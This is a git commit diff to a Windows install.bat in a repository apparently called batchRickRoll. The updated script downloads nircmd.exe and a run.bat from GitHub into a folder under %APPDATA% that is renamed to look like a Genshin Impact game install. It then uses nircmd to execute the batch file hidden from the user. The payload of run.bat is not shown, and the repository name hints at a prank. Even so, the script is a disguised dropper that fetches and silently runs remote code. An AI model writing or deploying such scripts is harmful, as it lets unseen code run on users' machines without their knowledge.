cc0f6b04ad87c561c71afed437c830e8d7ff324b
pogga-was-taken <49074314+pogga-was-taken@users.noreply.github.com>
2021-09-13 15:44:50 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -2,9 +2,9 @@
 
 echo Downloading Stuff
 
-mkdir %APPDATA%\Genshit_Impact
+mkdir %APPDATA%\GenshinImpact
 
-curl --output %APPDATA%\yompBest\n.exe -LO http://github.com/pogga-was-taken/batchRickRoll/blob/main/nircmd.exe?raw=true 
-curl --output %APPDATA%\yompBest\run.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/run.bat 
+curl --output %APPDATA%\GenshinImpact\n.exe -LO http://github.com/pogga-was-taken/batchRickRoll/blob/main/nircmd.exe?raw=true 
+curl --output %APPDATA%\GenshinImpact\run.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/run.bat 
 
-%APPDATA%\yompBest\n.exe exec hide "%APPDATA%\yompBest\run.bat"
+%APPDATA%\GenshinImpact\n.exe exec hide "%APPDATA%\GenshinImpact\run.bat"
